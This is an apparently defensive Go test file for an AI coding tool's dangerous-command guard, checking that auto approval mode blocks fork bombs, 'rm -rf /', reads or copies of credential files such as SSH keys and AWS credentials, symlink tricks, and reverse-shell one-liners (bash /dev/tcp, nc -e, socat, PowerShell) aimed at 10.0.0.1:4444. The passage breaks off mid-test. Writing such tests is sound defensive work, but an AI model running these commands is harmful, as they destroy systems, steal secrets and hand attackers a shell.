package runtime

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	internalconfig "snz1.cn/gitrepo/dp/ai/taiyi/taiyiflow-cli/internal/config"
)

func TestUnknownPermissionActionFailsClosed(t *testing.T) {
	cfg := internalconfig.Config{
		ApprovalMode:    "auto",
		PermissionRules: []internalconfig.PermissionRule{{ToolName: "shell_exec", Action: "unexpected"}},
	}
	if action, matched := evaluatePermissionAction(cfg, "shell_exec", "printf safe"); !matched || action != "deny" {
		t.Fatalf("unknown permission action must deny: action=%q matched=%t", action, matched)
	}
	runtimeClient := NewClientRuntime(strings.NewReader(""), nil, nil)
	if err := runtimeClient.authorizeClientTool("shell_exec", map[string]any{"raw_command": "printf safe"}, cfg); err == nil {
		t.Fatal("unknown permission action must not execute in auto mode")
	}
	if err := guardDangerousCommand(commandArguments{Mode: "shell", RawCommand: "printf safe"}, cfg); err == nil {
		t.Fatal("normalized command policy re-evaluation must deny unknown actions")
	}
}

// TestGuardDangerousCommandForkBombBashClassic verifies that the classic bash
// fork bomb pattern ":(){ :|:& };:" is blocked in auto approval mode.
func TestGuardDangerousCommandForkBombBashClassic(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "高风险命令") {
		t.Fatalf("expected high-risk error, got: %v", err)
	}
}

// TestGuardDangerousCommandForkBombBashVariant verifies that a variant with
// spaces like ": () { : | : & } ; :" is also blocked via the ":|:&" fragment.
func TestGuardDangerousCommandForkBombBashVariant(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ": () { : | : & } ; :",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb variant to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPerl verifies that the perl fork bomb
// "perl -e 'fork while fork'" is blocked.
func TestGuardDangerousCommandForkBombPerl(t *testing.T) {
	payload := commandArguments{
		Mode:    "shell",
		Command: "perl",
		Args:    []string{"-e", "fork while fork"},
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonOsFork verifies that python fork
// bomb using os.fork() is blocked.
func TestGuardDangerousCommandForkBombPythonOsFork(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.fork() to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonWhileLoop verifies that python fork
// bomb with explicit while loop is blocked.
func TestGuardDangerousCommandForkBombPythonWhileLoop(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; while True: os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python while-loop fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombAllowedInNonAutoMode verifies that fork
// bomb patterns are not blocked when approval mode is not "auto".
func TestGuardDangerousCommandForkBombAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardDangerousCommandExistingHighRisk verifies that existing high-risk
// patterns (rm -rf /) are still blocked.
func TestGuardDangerousCommandExistingHighRisk(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm -rf /",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf / to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandSafeCommand verifies that safe commands are not blocked.
func TestGuardDangerousCommandSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "echo hello",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe command to pass, got: %v", err)
	}
}

// TestGuardDangerousCommandAllowRuleDoesNotBypassGuards verifies that a
// tool-level allow rule no longer bypasses the dangerous-command guards:
// allow only skips approval confirmation, high-risk commands stay blocked
// in auto mode（对齐 Electron 端 handler 硬检查语义）.
func TestGuardDangerousCommandAllowRuleDoesNotBypassGuards(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm -rf /",
	}
	cfg := internalconfig.Config{
		ApprovalMode:    "auto",
		PermissionRules: []internalconfig.PermissionRule{{ToolName: "shell_exec", Action: "allow"}},
	}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf / to stay blocked under allow rule in auto mode, but got nil error")
	}
}

// TestGuardSensitiveFileAccessShellConfig verifies that reading shell config
// files (which may embed API keys and tokens) is blocked in auto approval mode.
func TestGuardSensitiveFileAccessShellConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.zshrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat ~/.zshrc to be blocked, but got nil error")
	}
}

// TestIsSensitivePathExtendedLists verifies the expanded sensitive-path list
// (shell configs, history files, browser profile stores) and that ordinary
// workspace paths are unaffected.
func TestIsSensitivePathExtendedLists(t *testing.T) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		t.Skip("no home dir available")
	}
	blocked := []string{
		filepath.Join(homeDir, ".zshrc"),
		filepath.Join(homeDir, ".env"),
		filepath.Join(homeDir, ".bash_history"),
		filepath.Join(homeDir, ".mozilla"),
	}
	for _, p := range blocked {
		if !isSensitivePath(p) {
			t.Errorf("expected %q to be treated as sensitive", p)
		}
	}
	wd, err := os.Getwd()
	if err == nil && isSensitivePath(filepath.Join(wd, "main.go")) {
		t.Error("expected ordinary workspace path to not be sensitive")
	}
}

// ---------------------------------------------------------------------------
// 敏感文件访问拦截测试
// ---------------------------------------------------------------------------

// TestGuardSensitiveFileAccessEtcPasswd verifies that reading /etc/passwd
// via cat is blocked in auto approval mode.
func TestGuardSensitiveFileAccessEtcPasswd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/passwd access to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "敏感文件") {
		t.Fatalf("expected sensitive file error, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessEtcShadow verifies that reading /etc/shadow
// via head is blocked.
func TestGuardSensitiveFileAccessEtcShadow(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "head -20 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/shadow access to be blocked")
	}
}

// TestGuardSensitiveFileAccessSSHKey verifies that reading SSH private keys
// is blocked.
func TestGuardSensitiveFileAccessSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.ssh/id_rsa",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected SSH key access to be blocked")
	}
}

// TestGuardSensitiveFileAccessAWSCredentials verifies that reading AWS
// credentials is blocked.
func TestGuardSensitiveFileAccessAWSCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.aws/credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected AWS credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessKubeConfig verifies that reading Kubernetes
// config is blocked.
func TestGuardSensitiveFileAccessKubeConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.kube/config",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected kube config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessDockerConfig verifies that reading Docker
// config is blocked.
func TestGuardSensitiveFileAccessDockerConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.docker/config.json",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Docker config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNetrc verifies that reading .netrc is blocked.
func TestGuardSensitiveFileAccessNetrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.netrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .netrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGitCredentials verifies that reading
// .git-credentials is blocked.
func TestGuardSensitiveFileAccessGitCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.git-credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .git-credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNpmrc verifies that reading .npmrc is blocked.
func TestGuardSensitiveFileAccessNpmrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.npmrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .npmrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessPypirc verifies that reading .pypirc is blocked.
func TestGuardSensitiveFileAccessPypirc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.pypirc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .pypirc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGnupg verifies that reading .gnupg is blocked.
func TestGuardSensitiveFileAccessGnupg(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ls ~/.gnupg/",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .gnupg access to be blocked")
	}
}

// TestGuardSensitiveFileAccessXxd verifies that using xxd to read a sensitive
// file is blocked.
func TestGuardSensitiveFileAccessXxd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "xxd /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected xxd /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessCp verifies that copying a sensitive file
// is blocked.
func TestGuardSensitiveFileAccessCp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cp /etc/passwd /tmp/leaked",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cp /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessAllowedInNonAutoMode verifies that sensitive
// file access is not blocked when approval mode is not "auto".
func TestGuardSensitiveFileAccessAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessSafeFile verifies that reading a non-sensitive
// file is not blocked.
func TestGuardSensitiveFileAccessSafeFile(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /tmp/hello.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe file access to pass, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessBase64 verifies that using base64 to read a
// sensitive file is blocked.
func TestGuardSensitiveFileAccessBase64(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 /etc/shadow to be blocked")
	}
}

// ---------------------------------------------------------------------------
// 反向 Shell 探测拦截测试
// ---------------------------------------------------------------------------

// TestGuardReverseShellBashDevTcp verifies that the classic bash /dev/tcp
// reverse shell is blocked.
func TestGuardReverseShellBashDevTcp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected bash /dev/tcp reverse shell to be blocked")
	}
	if !strings.Contains(err.Error(), "反向 Shell") {
		t.Fatalf("expected reverse shell error, got: %v", err)
	}
}

// TestGuardReverseShellBashShI verifies that "sh -i >&" pattern is blocked.
func TestGuardReverseShellBashShI(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected sh -i reverse shell to be blocked")
	}
}

// TestGuardReverseShellNetCatE verifies that "nc -e" reverse shell is blocked.
func TestGuardReverseShellNetCatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "nc -e /bin/sh 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected nc -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatE verifies that "ncat -e" reverse shell is blocked.
func TestGuardReverseShellNcatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -e /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatC verifies that "ncat -c" reverse shell is blocked.
func TestGuardReverseShellNcatC(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -c /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -c reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonSocket verifies that Python socket-based
// reverse shell is blocked.
func TestGuardReverseShellPythonSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",4444))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python socket reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonDup2 verifies that os.dup2 pattern is blocked.
func TestGuardReverseShellPythonDup2(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.dup2(2,0); os.dup2(2,1)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.dup2 reverse shell to be blocked")
	}
}

// TestGuardReverseShellPerlSocket verifies that Perl socket-based
// reverse shell is blocked.
func TestGuardReverseShellPerlSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,0); connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl reverse shell to be blocked")
	}
}

// TestGuardReverseShellRubySocket verifies that Ruby socket-based
// reverse shell is blocked.
func TestGuardReverseShellRubySocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ruby -rsocket -e 'TCPSocket.new(\"10.0.0.1\",\"4444\").puts \"hello\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ruby reverse shell to be blocked")
	}
}

// TestGuardReverseShellPHPFsockopen verifies that PHP fsockopen-based
// reverse shell is blocked.
func TestGuardReverseShellPHPFsockopen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r '$sock=fsockopen(\"10.0.0.1\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php fsockopen reverse shell to be blocked")
	}
}

// TestGuardReverseShellSocat verifies that socat-based reverse shell
// is blocked.
func TestGuardReverseShellSocat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "socat tcp-connect:10.0.0.1:4444 exec:sh,pty",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected socat reverse shell to be blocked")
	}
}

// TestGuardReverseShellPowerShell verifies that PowerShell TCPClient-based
// reverse shell is blocked.
func TestGuardReverseShellPowerShell(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected powershell reverse shell to be blocked")
	}
}

// TestGuardReverseShellBashRedirection verifies that "0>&1" pattern alone
// is blocked (common in reverse shell payloads).
func TestGuardReverseShellBashRedirection(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected 0>&1 redirection to be blocked")
	}
}

// TestGuardReverseShellMkfifoNetcat verifies that mkfifo + nc combination
// is blocked.
func TestGuardReverseShellMkfifoNetcat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected mkfifo+nc reverse shell to be blocked")
	}
}

// TestGuardReverseShellTelnet verifies that telnet-based reverse shell
// is blocked.
func TestGuardReverseShellTelnet(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "telnet 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected telnet reverse shell to be blocked")
	}
}

// TestGuardReverseShellDevUdp verifies that /dev/udp pattern is blocked.
func TestGuardReverseShellDevUdp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/udp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /dev/udp reverse shell to be blocked")
	}
}

// TestGuardReverseShellAllowedInNonAutoMode verifies that reverse shell
// patterns are not blocked when approval mode is not "auto".
func TestGuardReverseShellAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardReverseShellSafeCommand verifies that safe network commands
// are not blocked.
func TestGuardReverseShellSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl https://example.com/api",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe curl command to pass, got: %v", err)
	}
}

// TestGuardReverseShellSocketCreate verifies that PHP socket_create pattern
// is blocked.
func TestGuardReverseShellSocketCreate(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r 'socket_create(AF_INET, SOCK_STREAM, SOL_TCP)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php socket_create to be blocked")
	}
}

// ---------------------------------------------------------------------------
// 符号链接逃逸检测测试
// ---------------------------------------------------------------------------

// TestGuardSymlinkEscapeEtcPasswd verifies that creating a symlink to
// /etc/passwd is blocked.
func TestGuardSymlinkEscapeEtcPasswd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /etc/passwd /tmp/leaked_passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to /etc/passwd to be blocked")
	}
	if !strings.Contains(err.Error(), "符号链接") {
		t.Fatalf("expected symlink escape error, got: %v", err)
	}
}

// TestGuardSymlinkEscapeSSHKey verifies that creating a symlink to SSH key
// is blocked.
func TestGuardSymlinkEscapeSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s ~/.ssh/id_rsa /tmp/leaked_key",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to SSH key to be blocked")
	}
}

// TestGuardSymlinkEscapeForceFlag verifies that ln -sf to a sensitive path
// is blocked.
func TestGuardSymlinkEscapeForceFlag(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -sf /etc/shadow /tmp/leaked_shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ln -sf to /etc/shadow to be blocked")
	}
}

// TestGuardSymlinkEscapeAWSCredentials verifies that creating a symlink to
// AWS credentials is blocked.
func TestGuardSymlinkEscapeAWSCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s ~/.aws/credentials /tmp/leaked_aws",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected symlink to AWS credentials to be blocked")
	}
}

// TestGuardSymlinkEscapeSafeLink verifies that creating a symlink to a
// non-sensitive path is not blocked.
func TestGuardSymlinkEscapeSafeLink(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /tmp/source.txt /tmp/link.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe symlink to pass, got: %v", err)
	}
}

// TestGuardSymlinkEscapeAllowedInNonAutoMode verifies that symlink escape
// is not blocked when approval mode is not "auto".
func TestGuardSymlinkEscapeAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ln -s /etc/passwd /tmp/leaked",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 脚本语言复制敏感文件检测测试
// ---------------------------------------------------------------------------

// TestGuardScriptSensitiveAccessPythonOpen verifies that using Python to
// open /etc/passwd is blocked.
func TestGuardScriptSensitiveAccessPythonOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"/etc/passwd\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python open(/etc/passwd) to be blocked")
	}
	if !strings.Contains(err.Error(), "脚本语言") {
		t.Fatalf("expected script access error, got: %v", err)
	}
}

// TestGuardScriptSensitiveAccessPythonSSHKey verifies that using Python to
// read SSH key is blocked.
func TestGuardScriptSensitiveAccessPythonSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"~/.ssh/id_rsa\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python open(~/.ssh/id_rsa) to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPythonShutil verifies that using Python
// shutil.copy to copy sensitive file is blocked.
func TestGuardScriptSensitiveAccessPythonShutil(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import shutil; shutil.copy(\"/etc/passwd\", \"/tmp/leaked\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python shutil.copy to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPerlOpen verifies that using Perl to open
// /etc/shadow is blocked.
func TestGuardScriptSensitiveAccessPerlOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "perl -e 'open(my $fh, \"<\", \"/etc/shadow\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl open(/etc/shadow) to be blocked")
	}
}

// TestGuardScriptSensitiveAccessRubyFileOpen verifies that using Ruby
// File.open to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessRubyFileOpen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ruby -e 'File.open(\"/etc/passwd\").read'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ruby File.open to be blocked")
	}
}

// TestGuardScriptSensitiveAccessNodeFs verifies that using Node.js fs
// to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessNodeFs(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "node -e 'require(\"fs\").readFileSync(\"/etc/passwd\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected node fs.readFileSync to be blocked")
	}
}

// TestGuardScriptSensitiveAccessPHPFopen verifies that using PHP fopen
// to read sensitive file is blocked.
func TestGuardScriptSensitiveAccessPHPFopen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r 'fopen(\"/etc/shadow\", \"r\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php fopen to be blocked")
	}
}

// TestGuardScriptSensitiveAccessSafeScript verifies that a safe Python
// script is not blocked.
func TestGuardScriptSensitiveAccessSafeScript(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'print(\"hello world\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python script to pass, got: %v", err)
	}
}

// TestGuardScriptSensitiveAccessSafeFileRead verifies that reading a
// non-sensitive file via Python is not blocked.
func TestGuardScriptSensitiveAccessSafeFileRead(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'open(\"/tmp/hello.txt\").read()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe file read to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Base64 编码绕过防护测试
// ---------------------------------------------------------------------------

// TestGuardBase64BypassDirect verifies that base64 /etc/passwd is blocked.
func TestGuardBase64BypassDirect(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
